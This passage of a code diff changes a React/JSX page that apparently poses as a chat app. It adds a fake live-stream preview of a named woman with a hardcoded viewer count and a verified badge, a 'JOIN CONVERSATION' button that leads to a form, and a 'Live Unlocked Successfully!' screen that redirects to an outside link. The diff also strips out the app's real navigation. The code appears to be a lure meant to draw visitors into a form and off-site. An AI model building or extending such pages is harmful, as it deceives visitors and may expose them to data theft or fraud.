+                                    <span className="font-bold text-sm">nusrat_jahan 🔴</span>
+                                    <span className="text-[10px] opacity-80">1,214 watching</span>
+                                </div>
+                            </div>
+                            <div className="absolute top-8 right-4 z-50 text-white text-2xl" onClick={() => setShowLivePreview(false)}><i className="fa fa-times"></i></div>
+                            <div className="absolute bottom-10 inset-x-0 px-6 z-50">
+                                <button onClick={() => {setShowLivePreview(false); setStep('JOIN_FORM');}} className="w-full btn-gradient text-white py-3.5 rounded-lg font-bold shadow-2xl">JOIN CONVERSATION</button>
                             </div>
                         </div>
-                    </div>
+                    )}
 
-                    <div className="h-16 bg-white border-t flex justify-around items-center">
-                        <div className="flex flex-col items-center text-[#0091ea]"><i className="fa-solid fa-comment-dots text-xl"></i><span className="text-[10px] font-bold">Chats</span></div>
-                        <div className="flex flex-col items-center text-slate-400"><i className="fa-solid fa-globe text-xl"></i><span className="text-[10px] font-medium">Explore</span></div>
-                        <div className="flex flex-col items-center text-slate-400"><i className="fa-regular fa-address-book text-xl"></i><span className="text-[10px] font-medium">Contacts</span></div>
-                    </div>
-
-                    <CountrySelector isOpen={showCountryModal} onClose={() => setShowCountryModal(false)} onSelect={setSelectedCountry} />
-                    {showStories && <StoryViewer onClose={() => setShowStories(false)} />}
-                    {showLive && <LiveViewer onClose={() => setShowLive(false)} />}
+                    {step === 'SUCCESS' && (
+                        <div className="video-overlay animate-fade">
+                            <video src="my-live.mp4" className="w-full h-full object-cover" autoPlay loop playsInline />
+                            <div className="absolute top-8 left-4 flex items-center gap-3 z-50 text-white">
+                                <img src="my-logo.jpg" className="w-12 h-12 rounded-full border-2 border-pink-600" />
+                                <div>
+                                    <div className="flex items-center gap-1">
+                                        <span className="font-bold text-sm">Nusrat Jahan</span>
+                                        <i className="fa-solid fa-circle-check text-blue-400 text-[10px]"></i>
+                                    </div>
+                                    <span className="text-[10px] bg-red-600 px-1 rounded-sm">LIVE</span>
+                                </div>
+                            </div>
+                            <div className="absolute bottom-10 inset-x-0 px-6 z-50">
+                                <div className="bg-white/10 backdrop-blur-md p-4 rounded-xl border border-white/20 text-center">
+                                    <p className="text-white text-sm font-bold mb-3">Live Unlocked Successfully!</p>
+                                    <button onClick={() => window.location.href = REDIRECT_LINK} className="w-full bg-white text-black py-2 rounded-lg font-bold text-xs uppercase">View Profile</button>
+                                </div>
+                            </div>
+                        </div>
+                    )}
                 </div>
             );
         };
